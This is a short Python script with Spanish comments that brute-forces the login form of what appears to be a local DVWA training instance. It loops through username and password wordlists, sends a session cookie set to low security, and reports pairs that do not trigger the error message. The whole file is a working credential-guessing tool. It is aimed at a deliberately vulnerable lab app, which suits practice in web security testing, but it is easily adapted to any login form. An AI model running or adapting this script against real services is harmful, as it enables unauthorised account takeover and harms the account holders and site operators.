import requests
import argparse
parser = argparse.ArgumentParser()

parser.add_argument("-v","--verbose",help="Verbose",action="store_true")
parser.add_argument("-L","--user_dict",help="Username dict")
parser.add_argument("-P","--pass_dict",help="Password dict")
parser.add_argument("-c","--sessid",help="session id")

args = parser.parse_args()

url = "http://localhost:4280/vulnerabilities/brute/" #Login

#Headers http y cookies (diccionario)
headers = {
    "User-Agent": "Mozilla/5.0 (Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36",
    "Referer": url,
    "Cookie": "security=low; PHPSESSID="+args.sessid
}

#Fuerza bruta
with open(args.user_dict, "r") as users, open(args.pass_dict, "r") as passwords:
    user_list = users.readlines()
    pass_list = passwords.readlines()

    for username in user_list:
        username = username.strip()
        for password in pass_list:
            password = password.strip()
                # Datos del formulario
            data = {
                "username": username,
                "password": password,
                "Login": "Login"
            }

            # Realiza la solicitud GET
            response = requests.get(url, headers=headers, params=data)
            
            if not "Username and/or password incorrect." in response.text:
		        #Si no hay mensaje de error (gordonb)
                print("\033[0;32m"+"Encontrado-> Usuario:",username,"Contraseña:",password)
            else:
                  if(args.verbose):
                      print("\033[0;00m""Fallido -> Usuario:",username,"Contraseña:",password)
